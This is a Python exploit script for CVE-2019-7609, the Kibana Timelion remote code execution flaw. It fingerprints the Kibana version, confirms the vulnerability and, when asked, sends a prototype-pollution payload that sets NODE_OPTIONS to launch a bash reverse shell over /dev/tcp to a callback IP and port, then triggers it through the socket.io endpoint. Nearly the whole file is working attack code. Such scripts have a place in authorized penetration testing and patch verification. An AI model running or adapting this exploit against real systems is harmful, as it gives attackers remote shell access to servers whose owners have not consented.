#!/usr/bin/env python3
# coding:utf-8
# Original by LandGrey — fixed for Python 3 by Nano

import re
import sys
import time
import random
import argparse
import traceback

import requests
from packaging.version import Version

requests.packages.urllib3.disable_warnings()

version = None


def get_kibana_version(url):
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    target = "{}{}".format(url.rstrip("/"), "/app/kibana")
    r = requests.get(target, verify=False, headers=headers, timeout=30)
    # r.content is bytes in Python 3 — decode first
    content = r.content.decode('utf-8', errors='replace')
    patterns = [r'&quot;version&quot;:&quot;(.*?)&quot;,', r'"version":"(.*?)",']
    for pattern in patterns:
        match = re.findall(pattern, content)
        if match:
            return match[0]
    return '9.9.9'


def version_compare(standard_version, compare_version):
    try:
        sc1 = Version(standard_version[0])
        sc2 = Version(standard_version[1])
        cc  = Version(compare_version)
    except Exception:
        print("[-] ERROR: kibana version compare failed!")
        return False

    if sc1 > cc or (Version("6.0.0") <= cc and sc2 > cc):
        return True
    return False


def verify(url):
    global version
    if not version or not version_compare(["5.6.15", "6.6.1"], version):
        return False

    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': url,
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = ('{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now",'
            '"mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}')
    target = "{}{}".format(url.rstrip("/"), "/api/timelion/run")
    r = requests.post(target, data=data, verify=False, headers=headers, timeout=20)
    content = r.content.decode('utf-8', errors='replace')
    if r.status_code == 200 and 'application/json' in r.headers.get('content-type', '') and '"seriesList"' in content:
        return True
    return False


def reverse_shell(target, ip, port):
    random_name = "".join(random.sample('qwertyuiopasdfghjkl', 8))
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = (
        r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')'''
        r'''.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}'''
        % (random_name, random_name, ip, port)
    )
    url = "{}{}".format(target, "/api/timelion/run")
    r1 = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    if r1.status_code == 200:
        trigger_url = "{}{}".format(target, "/socket.io/?EIO=3&transport=polling&t=MtjhZoM")
        new_headers = dict(headers)
        new_headers['kbn-xsrf'] = 'professionally-crafted-string-of-text'
        r2 = requests.get(trigger_url, verify=False, headers=new_headers, timeout=20)
        if r2.status_code == 200:
            time.sleep(5)
            return True
    return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2019-7609 Kibana RCE PoC")
    parser.add_argument("-u",     dest='url',           default="http://127.0.0.1:5601", help="Target URL, e.g. http://10.10.x.x:5601")
    parser.add_argument("-host",  dest='remote_host',   default="127.0.0.1",             help="Reverse shell callback IP")
    parser.add_argument("-port",  dest='remote_port',   default="4444",                  help="Reverse shell callback port")
    parser.add_argument("--shell",dest='reverse_shell', action="store_true", default=False, help="Trigger reverse shell after verify")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    args = parser.parse_args()
    target      = args.url.rstrip('/')
    remote_host = args.remote_host
    remote_port = args.remote_port
    do_shell    = args.reverse_shell

    if "://" not in target:
        target = "http://" + target

    try:
        version = get_kibana_version(target)
        print("[*] Detected Kibana version: {}".format(version))

        result = verify(target)
        if result:
            print("[+] {} is likely vulnerable to CVE-2019-7609 (Kibana < 6.6.1 RCE)".format(target))
            if do_shell:
                print("[*] Sending reverse shell payload to {}:{}...".format(remote_host, remote_port))
                ok = reverse_shell(target, remote_host, remote_port)
                if ok:
                    print("[+] Payload sent! Check your listener on {}:{}".format(remote_host, remote_port))
                else:
                    print("[-] Reverse shell trigger failed.")
        else:
            print("[-] {} does not appear vulnerable.".format(target))

    except Exception:
        print("[-] Exploit failed!")
        traceback.print_exc()
